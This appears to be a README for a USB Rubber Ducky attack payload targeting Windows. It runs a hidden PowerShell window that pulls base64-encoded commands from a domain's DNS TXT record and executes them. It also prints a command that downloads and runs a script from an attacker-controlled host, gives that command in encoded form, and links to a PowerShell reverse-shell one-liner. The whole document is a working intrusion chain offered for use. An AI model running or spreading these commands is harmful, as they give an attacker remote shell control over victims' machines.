# DNS-TXT-CommandInection
Ducky Script uses Resolve-DnsName to perform a DNS name query resolution for a domain hosting a malicious TXT record.
## Description
A usb rubber ducky payload that leverages DNS TXT records to perform command injection. Windows Powershell is the CLI used by the payload. Replace the DNS TXT record for your domain with the base64 encoded payload you have. See link below for an example of creating your DNS TXT record in AWS Route53 service.
## Requirements
A domain with the ability to manipulate the DNS TXT records.
Web Server hosting the payload. In this example, python3 http.server was used to host a reverseshell.
Provide URL used for Example
DEFINE  #MY_TARGET_URL example.com
## Notes
No base64 can be used as an option by replacing "$a=",";powershell -e $a" with just "|iex" for the STRING payload below. Examples of the decoded command and encoded command are shown below to put into DNS TXT record.
Decoded: "irm http://MY_TARGET_URL/T1.txt | iex"
Encoded: "aQByAG0AIABoAHQAdABwADoALwAvAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAFQAMQAuAHQAeAB0ACAAfAAgAGkAZQB4AA=="
powershellReverseShellOne-liner.ps1 is identical to T1.txt. (shortened due to character limitations)
## Windows Commands (used in payload)
### Execute DNS TXT Payload
```Powershell
powershell /w 1 $a=(resolve-dnsname MY_TARGET_URL TXT).strings;powershell -e $a
```
### Execute web hosted Powershell Reverseshell
```Powershell
irm http://MY_TARGET_URL/T1.txt | iex
```
### [Powershell Reverseshell One-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
```Powershell
.\powershellReverseShellOne-liner.ps1
```
### Convert payload to base64
```Powershell
.\convertBase64.ps1
```
### Alternative to executing Powershell Script
```Powershell
gc -raw .\convertBase64.ps1 | iex
```
### Links

[Powershell Reverseshell One-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

[Convert to base64](https://pypi.org/project/uploadserver/)

[Create TXT record in AWS Route53](https://www.entrust.com/knowledgebase/ssl/how-to-create-a-txt-record-on-amazon-aws-route-53-for-entrust-email-validation-method)

